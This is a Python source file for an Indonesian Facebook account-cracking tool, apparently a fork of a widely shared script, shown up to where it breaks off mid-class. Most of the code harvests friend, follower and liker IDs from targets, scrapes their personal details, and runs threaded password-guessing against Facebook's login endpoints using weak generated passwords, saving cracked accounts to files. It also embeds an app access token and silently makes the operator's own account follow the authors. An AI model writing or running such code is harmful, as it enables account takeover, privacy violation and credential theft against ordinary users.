#!/usr/bin/python2
#-*-coding:utf-8-*-
# Created By Dapunta
# Fixed By DekuSec

import requests,bs4,sys,os,subprocess,uuid
import requests,sys,random,time,re,base64,json
import os, re, requests, concurrent.futures
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from datetime import date
from datetime import datetime
current = datetime.now()

p = "\x1b[0;37m" # putih
m = "\x1b[0;31m" # merah
h = "\x1b[0;32m" # hijau
k = "\x1b[0;36m" # biru muda
o = "\x1b[0;36m" # biru muda

if ("linux" in sys.platform.lower()):

        N = "\033[0m"
        G = "\033[1;92m"
        O = "\033[1;97m"
        R = "\033[1;91m"
else:

        N = ""
        G = ""
        O = ""
        R = ""

### HEADERS ###

def banner():
    print(""" \n            \n            \x1b[0;36m_____                    _ \n           |  __ \       \x1b[0;37mCopyright  \x1b[0;36m(\x1b[0;37m©\x1b[0;36m)  \x1b[0;37mDekuSec \n           \x1b[0;36m| |__) | __ ___ _ __ ___  _ _   _ _ __ ___ \n           |  ___/  __/ _ \  _ ` _ \| | | | |  _ ` _ \ \n           | |   | | |  __/ | | | | | | |_| | | | | | | \n           |_|   |_|  \___|_| |_| |_|_|\__,_|_| |_| |_| \x1b[0;37m\n """)

host="https://mbasic.facebook.com"
ua="Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
ips=None
try:
	b=requests.get("https://api.ipify.org").text.strip()
	ips=requests.get("https://ipapi.com/ip_api.php?ip="+b,headers={"Referer":"https://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}).json()["country_name"].lower()
except:
	ips=None
uas=None
if os.path.exists(".browser"):
	if os.path.getsize(".browser") !=0:
		uas=open(".browser").read().strip()

mbasic_h={"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":uas,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
m_fbh={"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":uas,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
ok = []
cp = []
ttl =[]

durasi = str(datetime.now().strftime("%d-%m-%Y"))
tahun = current.year
bulan = current.month
hari = current.day

def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

def clear():
	if " linux" in sys.platform.lower():
		os.system("clear")
	elif "win" in sys.platform.lower():
		os.system("cls")
	else:os.system("clear")
    
def lang(cookies):
	f=False
	rr=bs4.BeautifulSoup(requests.get("https://mbasic.facebook.com/language.php",headers=hdcok(),cookies=cookies).text,"html.parser")
	for i in rr.find_all("a",href=True):
		if "id_ID" in i.get("href"):
			requests.get("https://mbasic.facebook.com/"+i.get("href"),cookies=cookies,headers=hdcok())
			b=requests.get("https://mbasic.facebook.com/profile.php",headers=hdcok(),cookies=cookies).text	
			if "apa yang anda pikirkan sekarang" in b.lower():
				f=True
	if f==True:
		return True
	else:
		exit("[!] Cookies salah")

def basecookie():
	if os.path.exists(".cok"):
		if os.path.getsize(".cok") !=0:
			return gets_dict_cookies(open('.cok').read().strip())
		else:logs()
	else:logs()

def hdcok():
	global host,ua
	hosts=host
	r={"origin": hosts, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}
	return r

def gets_cookies(cookies):
	result=[]
	for i in enumerate(cookies.keys()):
		if i[0]==len(list(cookies.keys()))-1:result.append(i[1]+"="+cookies[i[1]])
		else:result.append(i[1]+"="+cookies[i[1]]+"; ")
	return "".join(result)

def gets_dict_cookies(cookies):
	result={}
	try:
		for i in cookies.split(";"):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
	except:
		for i in cookies.split("; "):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result

### LOGIN METHODE ###

def logs():
  os.system("clear")
  banner()
  print((k+"\n["+p+"1"+k+"]"+p+" Login Token"))
  print((k+"["+p+"2"+k+"]"+p+" Login Cookies"))
  print((k+"["+p+"3"+k+"]"+p+" Perbarui Script"))
  print((k+"["+p+"4"+k+"]"+p+" Lapor Bug"))
  print((k+"["+p+"0"+k+"]"+p+" Keluar"))
  pull=input(k+"\n["+p+"•"+k+"]"+p+" Pilih : ")
  if pull=="":
    print((k+"\n["+p+"!"+k+"]"+p+" Isi yang benar"))
    logs()
  elif pull=="1":
    log_token()
  elif pull=="2":
    gen()
  elif pull=="3":
    updatesc()
  elif pull=="4":
    wangsaff()
  elif pull=="0":
    exit()
  else:
    print((k+"\n["+p+"!"+k+"]"+p+" Isi yang benar"))
    logs()

def log_token():
    os.system("clear")
    banner()
    toket = input(k+"\n["+p+"•"+k+"]"+p+" Token : ")
    try:
        otw = requests.get("https://graph.facebook.com/me?access_token=" + toket)
        a = json.loads(otw.text)
        nama = a["name"]
        zedd = open("login.txt", "w")
        zedd.write(toket)
        zedd.close()
        print((k+"\n["+p+"•"+k+"]"+p+" Login Berhasil"))
        bot_follow()
    except KeyError:
        print((k+"["+p+"!"+k+"]"+p+" Token Salah"))
        os.system("clear")
        logs()

def gen():
        os.system("clear")
        banner()
        cookie = input(k+"\n["+p+"•"+k+"]"+p+" Cookies : ")
        try:
                data = requests.get("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_", headers = {
                "user-agent"                : "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36", # Jangan Di Ganti Ea Anjink.
                "referer"                   : "https://m.facebook.com/",
                "host"                      : "m.facebook.com",
                "origin"                    : "https://m.facebook.com",
                "upgrade-insecure-requests" : "1",
                "accept-language"           : "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                "cache-control"             : "max-age=0",
                "accept"                    : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                "content-type"              : "text/html; charset=utf-8"
                }, cookies = {
                "cookie"                    : cookie
                })
                find_token = re.search("(EAAA\w+)", data.text)
                hasil    = "\n* Gagal : Cookies Anda Mungkin Tidak Valid !!" if (find_token is None) else "\n* Token Fb Kamu : " + find_token.group(1)
        except requests.exceptions.ConnectionError:
                print((k+"["+p+"!"+k+"]"+p+" Periksa jaringan"))
        cookie = open("login.txt", "w")
        cookie.write(find_token.group(1))
        cookie.close()
        print((k+"\n["+p+"•"+k+"]"+p+" Login Berhasil"))
        bot_follow()
        
def bot_follow():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((k+"\n["+p+"!"+k+"]"+p+" Token Salah"))
		logs()
	requests.post("https://graph.facebook.com/1827084332/subscribers?access_token=" + toket)      #Dapunta Khurayra X
	requests.post("https://graph.facebook.com/100055245708473/subscribers?access_token=" + toket)      #DekuSec
	menu()

### MAIN MENU ###

def menu():
    try:
        toket = open("login.txt","r").read()
        otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
        a = json.loads(otw.text)
        nama = a["name"]
        id = a["id"]
    except Exception as e:
        print((k+"["+p+"•"+k+"]"+p+" Error : %s"%e))
        logs()
    ip = requests.get("https://api.ipify.org").text
    os.system("clear")
    banner()
    print ((o+"["+p+"+"+o+"]"+p+"-----------------------------"+o+"["+p+"+"+o+"]"+p)) 
    print((o+"["+p+"•"+o+"]"+p+" User Name  : "+a["name"]+p))  
    print((o+"["+p+"•"+o+"]"+p+" User ID    : "+id))
    print((o+"["+p+"•"+o+"]"+p+" IP Address : "+ip))
    print((o+"["+p+"•"+o+"]"+p+" Bergabung  : "+durasi))
    print ((o+"["+p+"+"+o+"]"+p+"-----------------------------"+o+"["+p+"+"+o+"]"+p)) 
    print((o+"\n["+p+"1"+o+"]"+p+" Ambil ID Dari Publik/Teman"))
    print((o+"["+p+"2"+o+"]"+p+" Ambil ID Dari Followers"))
    print((o+"["+p+"3"+o+"]"+p+" Ambil ID Dari Likers Post"))
    print((o+"["+p+"4"+o+"]"+p+" Ambil ID By Nama"))
    print((o+"["+p+"5"+o+"]"+p+" Mulai Crack"))
    print((o+"["+p+"6"+o+"]"+p+" Ambil Data Target"))
    print((o+"["+p+"7"+o+"]"+p+" Crack Dengan Nomor HP"))
    print((o+"["+p+"8"+o+"]"+p+" Crack Dengan Email"))
    print((o+"["+p+"9"+o+"]"+p+" Hasil Crack"))
    print((o+"["+p+"0"+o+"]"+p+" Keluar"))
    choose_menu()
	
def choose_menu():
	r=input(o+"\n["+p+"•"+o+"]"+p+" Pilih : ")
	if r=="":
		print((o+"["+p+"!"+o+"]"+p+" Isi yang benar"))
		menu()
	elif r=="1":
		publik()
	elif r=="2":
		follow()
	elif r=="3":
		likers()
	elif r=="4":
		search_name()
	elif r=="5":
		pilihcrack()
	elif r=="6":
		target()
	elif r=="7":
		random_numbers()
	elif r=="8":
		random_email()
	elif r=="9":
		ress()
	elif r=="0":
		try:
			jalan(o+"\n["+p+"•"+o+"]"+p+" Terimakasih Telah Menggunakan Script Ini")
			os.system("rm -rf login.txt")
			exit()
		except Exception as e:
			print((o+"["+p+"!"+o+"]"+p+" Error %s"%e))
	else:
		print((o+"["+p+"!"+o+"]"+p+" Salah Input"))
		menu()	

def useragent():
    uz = input(o+"\n["+p+"•"+o+"]"+p+"  Default/Manual User Agent? [d/m] : ")
    if uz=="":
        print((o+"\n["+p+"!"+o+"]"+p+" Isi yang benar"))
        menu()
    elif uz=="d":
        try:
            ua = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
            dpnt = open("useragent.txt","w")
            dpnt.write(ua)
            dpnt.close()
            pilihcrack()
        except KeyboardInterrupt:
            os.sys.exit()
    elif uz=="m":
        try:
            ua = input(o+"["+p+"•"+o+"]"+p+" User Agent : ")
            dpnt = open("useragent.txt","w")
            dpnt.write(ua)
            dpnt.close()
            pilihcrack()
        except KeyboardInterrupt:
            os.sys.exit()
    else:
        print((o+"\n["+p+"!"+o+"]"+p+" Isi yang benar"))
        menu()

def pilihcrack():
  print((o+"\n["+p+"1"+o+"]"+p+" Crack Api   (Cepat Crack)"))
  print((o+"["+p+"2"+o+"]"+p+" Crack Api + TTL   (Cepat Crack)"))
  print((o+"["+p+"3"+o+"]"+p+" Crack Mbasic   (Lambat Crack)"))
  print((o+"["+p+"4"+o+"]"+p+" Crack Mbasic + TTL   (Lambat Crack)"))
  print((o+"["+p+"5"+o+"]"+p+" Crack M Facebook   (Lambat Crack)"))
  pall=input(o+"\n["+p+"•"+o+"]"+p+" Pilih : ")
  if pall in[""]:
    print((o+"["+p+"!"+o+"]"+p+" Isi yang benar"))
    pilihcrack()
  elif pall in["1","01"]:
    bapi()
  elif pall in["2","02"]:
    bapittl()
  elif pall in["3","03"]:
    crack()
  elif pall in["4","04"]:
    crackttl()
  elif pall in["5","05"]:
    crackmfb()
  else:
    print((o+"["+p+"!"+o+"]"+p+" Isi yang benar"))
    pilihcrack()

### DUMP ID ###

def publik():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((o+"\n["+p+"!"+o+"]"+p+" Cookie/Token Salah"))
		os.system("rm -rf login.txt")
		logs()
	try:
		os.system("clear")
		banner()
		print((o+"\n["+p+"•"+o+"]"+p+" Ketik \'me\' Untuk Mengambil ID Dari Pertemanan Sendiri"))
		idt = input(o+"["+p+"•"+o+"]"+p+" Target ID : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((o+"["+p+"•"+o+"]"+p+" Nama      : "+h+op["name"]))
			print((o+"["+p+"•"+o+"]"+p+" Mengambil ID | Harap Tunggu...."))
		except KeyError:
			print((o+"["+p+"!"+o+"]"+p+" ID Tidak Ditemukan"))
			print((o+"\n[ "+p+"Kembali"+o+" ]"+p))
			publik()
		r=requests.get("https://graph.facebook.com/"+idt+"/friends?limit=10000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print((o+"\n["+p+"•"+o+"]"+p+" Total ID  :  %s"%(len(id))))
		jalan(o+"["+p+"•"+o+"]"+p+" Berhasil Mengambil ID")
		print((o+"["+p+"•"+o+"]"+p+" Salin Text Disamping "+k+"[ "+h+qq+k+" ]"+p))
		input(o+"\n[ "+p+"Kembali"+o+" ]"+p)
		menu()	
	except Exception as e:
		exit(o+"["+p+"!"+o+"]"+p+" Error : %s"%e)

def follow():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((o+"\n["+p+"!"+o+"]"+p+" Cookie/Token Salah"))
		os.system("rm -rf login.txt")
		logs()
	try:
		os.system("clear")
		banner()
		idt = input(o+"\n["+p+"•"+o+"]"+p+" Followers ID Target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((o+"["+p+"•"+o+"]"+p+" Nama : "+h+op["name"]))
			print((o+"["+p+"•"+o+"]"+p+" Mengambil ID | Harap Tunggu...."))
		except KeyError:
			print((o+"["+p+"!"+o+"]"+p+" ID Tidak Ditemukan"))
			print((o+"\n[ "+p+"Kembali"+o+" ]"+p))
			publik()
		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print((o+"\n["+p+"•"+o+"]"+p+" Total ID  :  %s"%(len(id))))
		jalan(o+"["+p+"•"+o+"]"+p+" Berhasil Mengambil ID")
		print((o+"["+p+"•"+o+"]"+p+" Salin Text Disamping "+k+"[ "+h+qq+k+" ]"+p))
		input(o+"\n[ "+p+"Kembali"+o+" ]"+p)
		menu()
	except Exception as e:
		exit(k+"["+p+"!"+o+"]"+p+" Error : %s"%e)

def likers():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((o+"\n["+p+"!"+o+"]"+p+" Cookie/Token Salah"))
		os.system("rm -rf login.txt")
		logs()
	try:
		os.system("clear")
		banner()
		idt = input(o+"\n["+p+"•"+o+"]"+p+" ID Post Target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((o+"["+p+"•"+o+"]"+p+" Nama : "+h+op["name"]))
			print((o+"["+p+"•"+o+"]"+p+" Mengambil ID | Harap Tunggu...."))
		except KeyError:
			print((o+"["+p+"!"+o+"]"+p+" ID Tidak Ditemukan"))
			print((o+"\n[ "+p+"Kembali"+o+" ]"+p))
			publik()
		r=requests.get("https://graph.facebook.com/"+idt+"/likes?limit=100000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print((k+"\n["+p+"•"+k+"]"+p+" Total ID : %s"%(len(id))))
		jalan(k+"["+p+"•"+k+"]"+p+" Berhasil Mengambil ID")
		print((k+"["+p+"•"+k+"]"+p+" Salin Text Disamping "+k+"[ "+h+qq+k+" ]"+p))
		input(k+"\n[ "+p+"Kembali"+k+" ]"+p)
		menu()
	except Exception as e:
		exit(k+"["+p+"!"+k+"]"+p+" Error : %s"%e)

def search_name():
    os.system("clear")
    banner()
    print((k+"\n["+p+"•"+k+"]"+p+" Fitur Ini Tidak Tersedia Saat Ini"))
    print((k+"["+p+"•"+k+"]"+p+" Silahkan Tunggu Sampai Berhasil"))
    input(k+"\n[ "+p+"Kembali"+k+" ]"+p)
    menu()

### CRACK EMAIL & PHONE ###

def random_numbers():
  data = []
  print((k+"\n["+p+"•"+k+"]"+p+" Nomor Harus Ada 5 Angka"))
  print((k+"["+p+"•"+k+"]"+p+" Contoh : 92037"))
  kode=str(input(k+"["+p+"•"+k+"]"+p+" Masukan Nomor : "))
  exit((k+"\n["+p+"!"+k+"]"+p+" Nomor Harus Ada 5 Angka")) if len(kode) < 5 else ''
  exit((k+"\n["+p+"!"+k+"]"+p+" Nomor Harus Ada 5 Angka")) if len(kode) > 5 else ''
  jml=int(input(k+"["+p+"•"+k+"]"+p+" Jumlah : "))
  [data.append({'user': str(e), 'pw':[str(e[5:]), str(e[6:])]}) for e in [str(kode)+''.join(['%s'%(randint(0,9)) for i in range(0,7)]) for e in range(jml)]]
  print(k+"\n["+p+"•"+k+"]"+p+" Crack Mulai, Harap tunggu... \n")
  with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
    {th.submit(brute, user['user'], user['pw']): user for user in data}
  input(k+"\n[ "+p+"Kembali"+k+" ]"+p)
  menu()

def random_email():
  data = []
  nama=input(k+"\n["+p+"•"+k+"]"+p+" Target Nama : ")
  domain=input(k+"["+p+"•"+k+"]"+p+" Pilih Domain [G]mail, [Y]ahoo, [H]otmail : ").lower().strip()
  list={
    'g':'@gmail.com',
    'y':'@yahoo.com',
    'h':'@hotmail.com'
  }
  exit((k+"["+p+"•"+k+"]"+p+" Isi yang benar")) if not domain in ['g','y','h'] else ''
  jml=int(input(k+"["+p+"•"+k+"]"+p+" Jumlah : "))
  setpw=input(k+"["+p+"•"+k+"]"+p+" Atur Password : ").split(',')
  print(k+"\n["+p+"•"+k+"]"+p+" Crack Mulai, Harap Tunggu... \n")
  [data.append({'user': nama+str(e)+list[domain], 'pw':[(i) for i in setpw]}) for e in range(1,jml+1)]
  with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
    {th.submit(brute, user['user'], user['pw']): user for user in data}
  input(k+"\n[ "+p+"Kembali"+k+" ]"+p)
  menu()

def brute(user, passs):
  try:
    for pw in passs:
      params={
        'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
        'format': 'JSON',
        'sdk_version': '2',
        'email': user,
        'locale': 'en_US',
        'password': pw,
        'sdk': 'ios',
        'generate_session_cookies': '1',
        'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
      }
      api='https://b-api.facebook.com/method/auth.login'
      response=requests.get(api, params=params)
      if re.search('(EAAA)\w+', str(response.text)):
        print('\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s • %s '%(str(user), str(pw)))
        break
      elif 'www.facebook.com' in response.json()['error_msg']:
        print('\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s '%(str(user), str(pw)))
        break
  except: pass

### INFO ACCOUNT ###

def target():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((k+"\n["+p+"!"+k+"]"+p+" Token Salah"))
		os.system("rm -rf login.txt")
		login()
	try:
		idt = input(k+"\n["+p+"•"+k+"]"+p+" ID Target        : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((k+"["+p+"•"+k+"]"+p+" Name Account     : "+op["name"]))
			print((k+"["+p+"•"+k+"]"+p+" Username         : "+op["username"]))
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print((k+"["+p+"•"+k+"]"+p+" Email            : "+op["email"]))
			except KeyError:
				print((k+"["+p+"•"+k+"]"+p+" Email            : -"))
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print((k+"["+p+"•"+k+"]"+p+" Date Of Birth    : "+op["birthday"]))
			except KeyError:
				print((k+"["+p+"•"+k+"]"+p+" Date Of Birth    : -"))
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print((k+"["+p+"•"+k+"]"+p+" Gender           : "+op["gender"]))
			except KeyError:
				print((k+"["+p+"•"+k+"]"+p+" Gender           : -"))
			try:
				r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
				id = []
				z = json.loads(r.text)
				qq = (op["first_name"]+".json").replace(" ","_")
				ys = open(qq , "w")
				for i in z["data"]:
					id.append(i["id"])
					ys.write(i["id"])
				ys.close()
				print((k+"["+p+"•"+k+"]"+p+" Total Teman      : %s"%(len(id))))
			except KeyError:
				print((k+"["+p+"•"+k+"]"+p+" Total Teman      : -"))
			try:
				a=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+toket)
				id = []
				b = json.loads(a.text)
				bb = (op["first_name"]+".json").replace(" ","_")
				jw = open(bb , "w")
				for c in b["data"]:
					id.append(c["id"])
					jw.write(c["id"])
				jw.close()
				print((k+"["+p+"•"+k+"]"+p+" Total Follower   : %s"%(len(id))))
			except KeyError:
				print((k+"["+p+"•"+k+"]"+p+" Total Follower   : -"))
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print((o+"["+p+"•"+o+"]"+p+" Website          : "+op["website"]))
			except KeyError:
				print((o+"["+p+"•"+o+"]"+p+" Website          : -"))
			except IOError:
				print((o+"["+p+"•"+o+"]"+p+" Website          : -"))
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print((o+"["+p+"•"+o+"]"+p+" Update Time      : "+op["updated_time"]))
			except KeyError:
				print((o+"["+p+"•"+o+"]"+p+" Update Time      : -"))
			except IOError:
				print((o+"["+p+"•"+o+"]"+p+" Update Time      : -"))
			input(o+"\n[ "+p+"Kembali"+o+" ]"+p)
			menu()
		except KeyError:
			input(k+"\n[ "+p+"Kembali"+o+" ]"+p)
			menu()
	except Exception as e:
		exit(o+"["+p+"•"+o+"]"+p+" Error : %s"%e)

### PASSWORD ###

def generate(text):
	results=[]
	global ips
	for i in text.split(" "):
		if len(i)<3:
			continue
		else:
			i=i.lower()
			if len(i)==3 or len(i)==4 or len(i)==5:
				results.append(i+"123")
				results.append(i+"1234")
				results.append(i+"12345")
			else:
				results.append(i+"123")
				results.append(i+"1234")
				results.append(i+"12345")
				results.append(i)
				if "indonesia" in ips:
					results.append("sayang")
					results.append("bismillah")
					results.append("anjing")
					results.append("kontol")
	return results

### BRUTE CRACK ###

def mbasic(em,pas,hosts):
	global ua,mbasic_h
	r=requests.Session()
	r.headers.update(mbasic_h)
	p=r.get("https://mbasic.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}

def m_fb(em,pas,hosts):
	global ua,m_fbh
	r=requests.Session()
	r.headers.update(m_fbh)
	p=r.get("https://m.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://m.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}

class crack:
	os.system("clear")
	banner()
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print((o+"\n["+p+"•"+o+"]"+p+" Crack Dengan Password Default/Manual [d/m]"))
		while True:
			f=input(o+"["+p+"•"+o+"]"+p+" Pilih : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=input(o+"["+p+"•"+o+"]"+p+" List ID : ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((o+"["+p+"•"+o+"]"+p+" Contoh : sayang,bismillah,123456"))
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=input(o+"["+p+"•"+o+"]"+p+" List ID : ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((o+"\n["+p+"•"+o+"]"+p+" Mulai Crack.... "+o+"\n["+p+"•"+o+"]"+p+" Akun [OK] Disimpan ke : ok.txt"+o+"\n["+p+"•"+o+"]"+p+" Akun [CP] Disimpan ke : cp.txt\n"))
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(o+"["+p+"•"+o+"]"+p+" Password : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((o+"\n["+p+"•"+o+"]"+p+" Mulai Crack.... "+o+"\n["+p+"•"+o+"]"+p+" Akun [OK] Disimpan ke : ok.txt"+o+"\n["+p+"•"+o+"]"+p+" Akun [CP] Disimpan ke : cp.txt\n"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="success":
					print(("\r\x1b[0;36m[\x1b[0;37mOK\x1b[0;36m] %s • %s               "%(fl.get("id"),i)))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					open("ok.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="cp":
					print(("\r\x1b[0;36m[\x1b[0;37mCP\x1b[0;36m] %s • %s               "%(fl.get("id"),i)))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;37m[Crack] %s/%s | OK : %s | CP : %s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)

class crackttl:
	os.system("clear")
	banner()
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print((k+"\n["+p+"•"+k+"]"+p+" Crack Dengan Password Default/Manual [d/m]"))
		while True:
			f=input(k+"["+p+"•"+k+"]"+p+" Pilih : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=input(k+"["+p+"•"+k+"]"+p+" List ID : ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((o+"["+p+"•"+o+"]"+p+" Comtoh : sayang,bismillah,123456"))
				self.pwlist()
				break
			elif f=="d":
				try:
